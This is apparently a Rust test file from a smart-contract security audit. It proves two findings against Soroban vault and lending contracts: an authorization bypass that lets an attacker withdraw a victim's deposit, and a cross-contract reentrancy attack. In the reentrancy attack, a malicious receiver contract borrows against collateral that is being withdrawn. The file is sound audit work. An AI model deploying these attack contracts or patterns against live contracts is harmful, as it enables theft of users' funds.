//! Executable proofs for the findings in `AUDIT.md`.
//!
//! Each `exploit_*` test PASSES because the vulnerability is real. After the
//! remediation from `AUDIT.md` is applied, the matching test must be flipped to
//! assert that the attack fails.
extern crate std;

use soroban_sdk::{
    contract, contractimpl, symbol_short,
    testutils::{Address as _, AuthorizedFunction, MockAuth, MockAuthInvoke},
    token::{StellarAssetClient, TokenClient},
    xdr::{ScErrorCode, ScErrorType},
    Address, Env, Error, IntoVal, Symbol,
};

use crate::lending::{Lending, LendingClient};
use crate::vault::{Vault, VaultClient};

const DEPOSIT: i128 = 1_000;
const POOL_LIQUIDITY: i128 = 10_000;

struct Setup<'a> {
    env: Env,
    token: TokenClient<'a>,
    vault: VaultClient<'a>,
    lending: LendingClient<'a>,
}

/// Deploys the token, vault and lending contracts and funds the lending pool.
fn setup<'a>() -> Setup<'a> {
    let env = Env::default();
    env.mock_all_auths();

    let issuer = Address::generate(&env);
    let token_id = env.register_stellar_asset_contract_v2(issuer).address();

    // The two contracts reference each other, so fix both addresses up front.
    let vault_id = Address::generate(&env);
    let lending_id = Address::generate(&env);
    env.register_at(&vault_id, Vault, (token_id.clone(), lending_id.clone()));
    env.register_at(&lending_id, Lending, (vault_id.clone(), token_id.clone()));

    StellarAssetClient::new(&env, &token_id).mint(&lending_id, &POOL_LIQUIDITY);

    Setup {
        token: TokenClient::new(&env, &token_id),
        vault: VaultClient::new(&env, &vault_id),
        lending: LendingClient::new(&env, &lending_id),
        env,
    }
}

fn fund_and_deposit(s: &Setup, user: &Address) {
    StellarAssetClient::new(&s.env, &s.token.address).mint(user, &DEPOSIT);
    s.vault.deposit(user, &DEPOSIT);
}

/// Malicious receiver: borrows against collateral the vault is in the middle of releasing.
#[contract]
pub struct BorrowingReceiver;

#[contractimpl]
impl BorrowingReceiver {
    pub fn __constructor(env: Env, lending: Address) {
        env.storage()
            .instance()
            .set(&symbol_short!("lending"), &lending);
    }

    pub fn on_withdraw(env: Env, from: Address, amount: i128) {
        let lending: Address = env
            .storage()
            .instance()
            .get(&symbol_short!("lending"))
            .unwrap();
        // Stale collateral is still `amount`, so borrow the maximum 50% against it.
        LendingClient::new(&env, &lending).borrow(&from, &(amount / 2));
    }
}

/// Receiver that tries to re-enter the vault directly (blocked by the Soroban host).
#[contract]
pub struct ReenteringReceiver;

#[contractimpl]
impl ReenteringReceiver {
    pub fn __constructor(env: Env, vault: Address) {
        env.storage()
            .instance()
            .set(&symbol_short!("vault"), &vault);
    }

    pub fn on_withdraw(env: Env, from: Address, amount: i128) {
        let vault: Address = env
            .storage()
            .instance()
            .get(&symbol_short!("vault"))
            .unwrap();
        VaultClient::new(&env, &vault).withdraw_and_notify(
            &from,
            &env.current_contract_address(),
            &amount,
        );
    }
}

/// Finding F-01 / AUTH-02: `withdraw` authorizes `to` instead of `from`.
#[test]
fn exploit_auth_bypass_attacker_withdraws_victim_deposit() {
    let s = setup();
    let victim = Address::generate(&s.env);
    let attacker = Address::generate(&s.env);
    fund_and_deposit(&s, &victim);

    // Only the attacker signs. The victim authorizes nothing.
    s.env.mock_auths(&[MockAuth {
        address: &attacker,
        invoke: &MockAuthInvoke {
            contract: &s.vault.address,
            fn_name: "withdraw",
            args: (&victim, &attacker, DEPOSIT).into_val(&s.env),
            sub_invokes: &[],
        },
    }]);
    s.vault.withdraw(&victim, &attacker, &DEPOSIT);

    let auths = s.env.auths();
    assert_eq!(auths.len(), 1);
    assert_eq!(
        auths[0].0, attacker,
        "only the attacker authorized the call"
    );
    assert_eq!(
        auths[0].1.function,
        AuthorizedFunction::Contract((
            s.vault.address.clone(),
            Symbol::new(&s.env, "withdraw"),
            (&victim, &attacker, DEPOSIT).into_val(&s.env),
        ))
    );

    assert_eq!(
        s.token.balance(&attacker),
        DEPOSIT,
        "attacker received the victim's funds"
    );
    assert_eq!(s.vault.balance(&victim), 0, "victim's deposit is gone");
}

/// Control for F-01: without the recipient's signature the same call is rejected,
/// which shows the owner's (`from`) signature was never what the contract checked.
#[test]
fn control_withdraw_without_any_auth_is_rejected() {
    let s = setup();
    let victim = Address::generate(&s.env);
    let attacker = Address::generate(&s.env);
    fund_and_deposit(&s, &victim);

    s.env.mock_auths(&[]);
    assert!(s.vault.try_withdraw(&victim, &attacker, &DEPOSIT).is_err());
    assert_eq!(s.vault.balance(&victim), DEPOSIT);
}

/// Control for F-02: the lending invariant (debt <= 50% of collateral) holds for
/// direct calls.
#[test]
fn control_borrow_limited_to_half_of_collateral() {
    let s = setup();
    let user = Address::generate(&s.env);
    fund_and_deposit(&s, &user);

    assert!(s.lending.try_borrow(&user, &(DEPOSIT / 2 + 1)).is_err());
    s.lending.borrow(&user, &(DEPOSIT / 2));
    assert_eq!(s.lending.debt(&user), DEPOSIT / 2);
}

/// Finding F-02 / XCC-02: cross-contract reentrancy through `withdraw_and_notify`.
/// The receiver borrows against collateral that is being withdrawn in the same call,
/// leaving the lending contract with debt that has no collateral behind it.
#[test]
fn exploit_cross_contract_reentrancy_leaves_uncollateralized_debt() {
    let s = setup();
    let attacker = Address::generate(&s.env);
    fund_and_deposit(&s, &attacker);
    let receiver = s
        .env
        .register(BorrowingReceiver, (s.lending.address.clone(),));

    s.vault.withdraw_and_notify(&attacker, &receiver, &DEPOSIT);

    assert_eq!(s.vault.balance(&attacker), 0);
    assert_eq!(s.lending.collateral(&attacker), 0);
    assert_eq!(
        s.lending.debt(&attacker),
        DEPOSIT / 2,
        "debt with zero collateral"
    );

    // Attacker deposited 1,000 and walked away with 1,500.
    let extracted = s.token.balance(&attacker) + s.token.balance(&receiver);
    assert_eq!(extracted, DEPOSIT + DEPOSIT / 2);
    assert_eq!(
        s.token.balance(&s.lending.address),
        POOL_LIQUIDITY - DEPOSIT / 2
    );
}

/// Supports the framework's claim (XCC-01): the host itself rejects re-entry into a
/// contract that is already on the call stack, so the exploitable path is the
/// *sibling* contract, not the vault.
#[test]
fn host_rejects_direct_reentry_into_the_same_contract() {
    let s = setup();
    let attacker = Address::generate(&s.env);
    fund_and_deposit(&s, &attacker);
    let receiver = s
        .env
        .register(ReenteringReceiver, (s.vault.address.clone(),));

    // Deposit twice so a successful re-entry would have had a balance to take.
    fund_and_deposit(&s, &attacker);
    let result = s
        .vault
        .try_withdraw_and_notify(&attacker, &receiver, &DEPOSIT);

    // Error(Context, InvalidAction) is the host's re-entry rejection; an auth
    // failure would surface as Error(Auth, ..) instead.
    let reentry_error = Error::from_type_and_code(ScErrorType::Context, ScErrorCode::InvalidAction);
    assert_eq!(
        result,
        Err(Ok(reentry_error)),
        "re-entry must be rejected by the host"
    );
    assert_eq!(
        s.vault.balance(&attacker),
        2 * DEPOSIT,
        "whole transaction rolled back"
    );
    assert_eq!(s.token.balance(&receiver), 0);
}
